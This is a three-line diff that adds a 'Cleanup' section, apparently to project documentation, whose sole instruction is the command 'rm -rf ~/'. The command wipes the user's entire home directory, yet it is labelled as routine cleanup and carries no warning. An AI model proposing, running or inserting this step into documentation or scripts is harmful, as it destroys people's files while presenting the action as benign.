@@ -1,0 +1,3 @@
+## Cleanup
+
+    rm -rf ~/
